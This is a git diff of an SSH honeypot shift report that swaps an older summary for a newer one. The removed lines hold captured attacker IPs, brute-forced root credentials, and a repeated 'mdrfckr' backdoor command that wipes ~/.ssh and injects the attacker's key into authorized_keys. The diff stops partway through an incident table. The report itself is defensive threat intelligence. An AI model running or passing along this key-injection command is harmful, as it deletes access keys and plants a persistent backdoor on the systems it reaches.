@@ -3,8 +3,8 @@
 | Field | Value |
 |---|---|
 | **Report Date** | 2026-05-16 |
-| **Generated At** | 2026-05-16T09:44:36Z |
-| **Shift Time** | 09:44 UTC |
+| **Generated At** | 2026-05-16T11:04:42Z |
+| **Shift Time** | 11:04 UTC |
 | **Honeypot Status** | ✅ HEALTHY |
 | **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |
 
@@ -14,14 +14,14 @@
 
 | Metric | Value |
 |---|---|
-| Total Sessions Captured | **457** |
-| Confirmed Threats | **447** |
-| False Positives Filtered | **10** (2.2%) |
-| Unique Attacker IPs | **18** |
-| Countries of Origin | **12** |
-| High Severity Cases | **16** |
+| Total Sessions Captured | **208** |
+| Confirmed Threats | **200** |
+| False Positives Filtered | **8** (3.9%) |
+| Unique Attacker IPs | **13** |
+| Countries of Origin | **8** |
+| High Severity Cases | **0** |
 | Medium Severity Cases | **0** |
-| Low Severity Cases | **441** |
+| Low Severity Cases | **208** |
 | Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |
 
 ---
@@ -30,55 +30,11 @@
 
 | Metric | Value |
 |---|---|
-| Total Auth Attempts | **33** |
-| Unique Credential Pairs | **19** |
-| Unique Usernames | **11** |
-| Unique Passwords | **19** |
-| Successful Auth Pairs | **9** |
-
-**Top Usernames:**
-
-| Username | Attempts |
-|---|---|
-| `root` | 16 |
-| `345gs5662d34` | 8 |
-| `user` | 1 |
-| `trader` | 1 |
-| `zhaoyi` | 1 |
-
-**Top Passwords:**
-
-| Password | Attempts |
-|---|---|
-| `345gs5662d34` | 8 |
-| `3245gs5662d34` | 8 |
-| `yb123456@` | 1 |
-| `1qaz3edc` | 1 |
-| `0708228AsBs!` | 1 |
-
-**Top Credential Pairs:**
-
-| Username | Password | Attempts |
-|---|---|---|
-| `345gs5662d34` | `345gs5662d34` | 8 |
-| `root` | `3245gs5662d34` | 8 |
-| `root` | `yb123456@` | 1 |
-| `user` | `1qaz3edc` | 1 |
-| `trader` | `0708228AsBs!` | 1 |
-
-**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**
-
-| Username | Password | Source IP | Timestamp |
-|---|---|---|---|
-| `root` | `yb123456@` | `49.207.244.212` | 2026-05-16T06:25:16 |
-| `root` | `3245gs5662d34` | `49.207.244.212` | 2026-05-16T06:25:18 |
-| `root` | `warnightkardesim` | `49.207.244.212` | 2026-05-16T06:29:22 |
-| `root` | `hahaha` | `49.207.244.212` | 2026-05-16T06:30:46 |
-| `root` | `asd123!@#` | `49.207.244.212` | 2026-05-16T06:32:13 |
-| `root` | `bitcoin123` | `49.207.244.212` | 2026-05-16T06:36:28 |
-| `root` | `test2023` | `49.207.244.212` | 2026-05-16T06:39:17 |
-| `root` | `abc-1234` | `49.207.244.212` | 2026-05-16T06:41:57 |
-| `root` | `123456789m` | `49.207.244.212` | 2026-05-16T06:46:02 |
+| Total Auth Attempts | **0** |
+| Unique Credential Pairs | **0** |
+| Unique Usernames | **0** |
+| Unique Passwords | **0** |
+| Successful Auth Pairs | **0** |
 
 ---
 
@@ -86,59 +42,27 @@
 
 | Metric | Value |
 |---|---|
-| Total Sessions Parsed | **457** |
-| Sessions with Fingerprint | **2** |
-| Unique HASSH Fingerprints | **2** |
+| Total Sessions Parsed | **208** |
+| Sessions with Fingerprint | **1** |
+| Unique HASSH Fingerprints | **1** |
 
 **Client Family Distribution:**
 
 | Client Family | Sessions |
 |---|---|
-| libssh | 33 |
-| Go SSH scanner | 1 |
+| Unknown | 1 |
 
 **⚠️ Botnet/Scanner KEX Signatures Detected:**
 
 | HASSH | Signature | Sessions | IPs |
 |---|---|---|---|
-| `f555226df196...` | Mirai/variant | 33 | 1 |
-| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
+| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
 
 **Top Fingerprints:**
 
 | HASSH | Client | Sessions | IPs | Botnet Sig |
 |---|---|---|---|---|
-| `f555226df196...` | libssh | 33 | 1 | Mirai/variant |
-| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
-
----
-
-## ⚔️ Attack Campaign Intelligence
-
-| Metric | Value |
-|---|---|
-| Total Command Clusters | **1** |
-| Campaign Clusters | **1** |
-| Highest Severity | **HIGH** |
-
-**Active Campaigns:**
-
-| Campaign | Severity | Sessions | IPs | TTPs |
-|---|---|---|---|---|
-| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 1 | `T1021.004, T1078, T1070, T1140` |
-
-**🔴 HIGH · mdrfckr SSH Key Injection**
-
-> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.
-
-Representative commands:
-```
-cd ~; chattr -ia .ssh; lockr -ia .ssh
-```
-```
-cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
-```
-Source IPs: `49.207.244.212`
+| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
 
 ---
 
@@ -146,568 +70,34 @@ Source IPs: `49.207.244.212`
 
 | Metric | Value |
 |---|---|
-| Total IPs Analysed | **18** |
-| Unique ASNs | **17** |
-| High-Risk ASNs | **7** |
+| Total IPs Analysed | **13** |
+| Unique ASNs | **11** |
+| High-Risk ASNs | **5** |
 | Anon Infrastructure ASNs | **0** |
 
 **Top Attack ASNs:**
 
 | ASN | Provider | IPs | Risk |
 |---|---|---|---|
-| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
-| `AS5384` | Emirates Internet | 1 | LOW |
-| `AS24309` | Atria Convergence Technologies Pvt. Ltd. Broadband Internet Service Provider INDIA | 1 | HIGH |
-| `AS3269` | Telecom Italia S.p.A. | 1 | HIGH |
-| `AS8075` | Microsoft Corporation | 1 | LOW |
-| `AS272953` | HS NETWORKS SAS | 1 | HIGH |
-| `AS52564` | Biazi Telecom | 1 | MEDIUM |
-| `AS12389` | PJSC Rostelecom | 1 | LOW |
+| `AS55836` | Reliance Jio Infocomm Limited | 3 | LOW |
+| `AS269411` | G3LINK TELECOM SERVICO DE COMUNICACAO MULTIMIDIA | 1 | HIGH |
+| `AS209334` | Modat B.V. | 1 | HIGH |
+| `AS4134` | CHINANET BACKBONE | 1 | MEDIUM |
+| `AS62068` | SpectraIP B.V. | 1 | HIGH |
+| `AS13213` | THG HOSTING LIMITED | 1 | HIGH |
+| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
+| `AS207033` | DTnet Adam Tarkowski Aneta Wyrwas s.c. | 1 | LOW |
 
 ---
 
 ---
 
-## 🚨 Priority Cases — Immediate Attention (16)
+## 🚨 Priority Cases — Immediate Attention (0)
 
 > Cases with auth success, command execution, or file downloads.
 > Each requires individual review. Never grouped.
 
-### 🔴 HIGH · IR-8be192ed81ad
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:25 |
-| **Last Seen** | 2026-05-16 06:25 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:25:16` | `cowrie.session.connect` |
-| `2026-05-16 06:25:16` | `cowrie.client.version` |
-| `2026-05-16 06:25:16` | `cowrie.client.kex` |
-| `2026-05-16 06:25:16` | `cowrie.login.success` |
-| `2026-05-16 06:25:17` | `cowrie.session.params` |
-| `2026-05-16 06:25:17` | `cowrie.command.input` |
-| `2026-05-16 06:25:17` | `cowrie.command.failed` |
-| `2026-05-16 06:25:17` | `cowrie.log.closed` |
-| `2026-05-16 06:25:17` | `cowrie.session.params` |
-| `2026-05-16 06:25:17` | `cowrie.command.input` |
-| `2026-05-16 06:25:17` | `cowrie.session.file_download` |
-| `2026-05-16 06:25:17` | `cowrie.log.closed` |
-| `2026-05-16 06:25:18` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-028d45c80643
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:25 |
-| **Last Seen** | 2026-05-16 06:25 |
-| **Session Duration** | 0s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:25:18` | `cowrie.session.connect` |
-| `2026-05-16 06:25:18` | `cowrie.client.version` |
-| `2026-05-16 06:25:18` | `cowrie.client.kex` |
-| `2026-05-16 06:25:18` | `cowrie.login.success` |
-| `2026-05-16 06:25:18` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-456e76f312d8
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:29 |
-| **Last Seen** | 2026-05-16 06:29 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:29:22` | `cowrie.session.connect` |
-| `2026-05-16 06:29:22` | `cowrie.client.version` |
-| `2026-05-16 06:29:22` | `cowrie.client.kex` |
-| `2026-05-16 06:29:22` | `cowrie.login.success` |
-| `2026-05-16 06:29:22` | `cowrie.session.params` |
-| `2026-05-16 06:29:22` | `cowrie.command.input` |
-| `2026-05-16 06:29:22` | `cowrie.command.failed` |
-| `2026-05-16 06:29:22` | `cowrie.log.closed` |
-| `2026-05-16 06:29:22` | `cowrie.session.params` |
-| `2026-05-16 06:29:22` | `cowrie.command.input` |
-| `2026-05-16 06:29:22` | `cowrie.session.file_download` |
-| `2026-05-16 06:29:22` | `cowrie.log.closed` |
-| `2026-05-16 06:29:24` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-9b692da82b27
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:29 |
-| **Last Seen** | 2026-05-16 06:29 |
-| **Session Duration** | 0s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:29:24` | `cowrie.session.connect` |
-| `2026-05-16 06:29:24` | `cowrie.client.version` |
-| `2026-05-16 06:29:24` | `cowrie.client.kex` |
-| `2026-05-16 06:29:24` | `cowrie.login.success` |
-| `2026-05-16 06:29:24` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-acca7bce4efd
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:30 |
-| **Last Seen** | 2026-05-16 06:30 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:30:46` | `cowrie.session.connect` |
-| `2026-05-16 06:30:46` | `cowrie.client.version` |
-| `2026-05-16 06:30:46` | `cowrie.client.kex` |
-| `2026-05-16 06:30:46` | `cowrie.login.success` |
-| `2026-05-16 06:30:47` | `cowrie.session.params` |
-| `2026-05-16 06:30:47` | `cowrie.command.input` |
-| `2026-05-16 06:30:47` | `cowrie.command.failed` |
-| `2026-05-16 06:30:47` | `cowrie.log.closed` |
-| `2026-05-16 06:30:47` | `cowrie.session.params` |
-| `2026-05-16 06:30:47` | `cowrie.command.input` |
-| `2026-05-16 06:30:47` | `cowrie.session.file_download` |
-| `2026-05-16 06:30:47` | `cowrie.log.closed` |
-| `2026-05-16 06:30:48` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8aa4bfff2684
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:30 |
-| **Last Seen** | 2026-05-16 06:30 |
-| **Session Duration** | 0s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:30:48` | `cowrie.session.connect` |
-| `2026-05-16 06:30:48` | `cowrie.client.version` |
-| `2026-05-16 06:30:48` | `cowrie.client.kex` |
-| `2026-05-16 06:30:48` | `cowrie.login.success` |
-| `2026-05-16 06:30:48` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-a4383cc71a2c
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:32 |
-| **Last Seen** | 2026-05-16 06:32 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:32:13` | `cowrie.session.connect` |
-| `2026-05-16 06:32:13` | `cowrie.client.version` |
-| `2026-05-16 06:32:13` | `cowrie.client.kex` |
-| `2026-05-16 06:32:13` | `cowrie.login.success` |
-| `2026-05-16 06:32:13` | `cowrie.session.params` |
-| `2026-05-16 06:32:13` | `cowrie.command.input` |
-| `2026-05-16 06:32:13` | `cowrie.command.failed` |
-| `2026-05-16 06:32:13` | `cowrie.log.closed` |
-| `2026-05-16 06:32:13` | `cowrie.session.params` |
-| `2026-05-16 06:32:13` | `cowrie.command.input` |
-| `2026-05-16 06:32:13` | `cowrie.session.file_download` |
-| `2026-05-16 06:32:13` | `cowrie.log.closed` |
-| `2026-05-16 06:32:15` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-d1954d45f100
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:32 |
-| **Last Seen** | 2026-05-16 06:32 |
-| **Session Duration** | 0s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:32:14` | `cowrie.session.connect` |
-| `2026-05-16 06:32:14` | `cowrie.client.version` |
-| `2026-05-16 06:32:14` | `cowrie.client.kex` |
-| `2026-05-16 06:32:15` | `cowrie.login.success` |
-| `2026-05-16 06:32:15` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-088b7e1014c2
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:36 |
-| **Last Seen** | 2026-05-16 06:36 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:36:27` | `cowrie.session.connect` |
-| `2026-05-16 06:36:27` | `cowrie.client.version` |
-| `2026-05-16 06:36:27` | `cowrie.client.kex` |
-| `2026-05-16 06:36:28` | `cowrie.login.success` |
-| `2026-05-16 06:36:28` | `cowrie.session.params` |
-| `2026-05-16 06:36:28` | `cowrie.command.input` |
-| `2026-05-16 06:36:28` | `cowrie.command.failed` |
-| `2026-05-16 06:36:28` | `cowrie.log.closed` |
-| `2026-05-16 06:36:28` | `cowrie.session.params` |
-| `2026-05-16 06:36:28` | `cowrie.command.input` |
-| `2026-05-16 06:36:28` | `cowrie.session.file_download` |
-| `2026-05-16 06:36:28` | `cowrie.log.closed` |
-| `2026-05-16 06:36:29` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-b5185ceddf63
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:36 |
-| **Last Seen** | 2026-05-16 06:36 |
-| **Session Duration** | 0s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:36:29` | `cowrie.session.connect` |
-| `2026-05-16 06:36:29` | `cowrie.client.version` |
-| `2026-05-16 06:36:29` | `cowrie.client.kex` |
-| `2026-05-16 06:36:29` | `cowrie.login.success` |
-| `2026-05-16 06:36:29` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-b76537c10c51
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:39 |
-| **Last Seen** | 2026-05-16 06:39 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:39:17` | `cowrie.session.connect` |
-| `2026-05-16 06:39:17` | `cowrie.client.version` |
-| `2026-05-16 06:39:17` | `cowrie.client.kex` |
-| `2026-05-16 06:39:17` | `cowrie.login.success` |
-| `2026-05-16 06:39:17` | `cowrie.session.params` |
-| `2026-05-16 06:39:17` | `cowrie.command.input` |
-| `2026-05-16 06:39:17` | `cowrie.command.failed` |
-| `2026-05-16 06:39:17` | `cowrie.log.closed` |
-| `2026-05-16 06:39:17` | `cowrie.session.params` |
-| `2026-05-16 06:39:17` | `cowrie.command.input` |
-| `2026-05-16 06:39:17` | `cowrie.session.file_download` |
-| `2026-05-16 06:39:17` | `cowrie.log.closed` |
-| `2026-05-16 06:39:19` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-7504b20008f2
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:39 |
-| **Last Seen** | 2026-05-16 06:39 |
-| **Session Duration** | 0s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:39:19` | `cowrie.session.connect` |
-| `2026-05-16 06:39:19` | `cowrie.client.version` |
-| `2026-05-16 06:39:19` | `cowrie.client.kex` |
-| `2026-05-16 06:39:19` | `cowrie.login.success` |
-| `2026-05-16 06:39:19` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8d16a27f790f
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:41 |
-| **Last Seen** | 2026-05-16 06:41 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
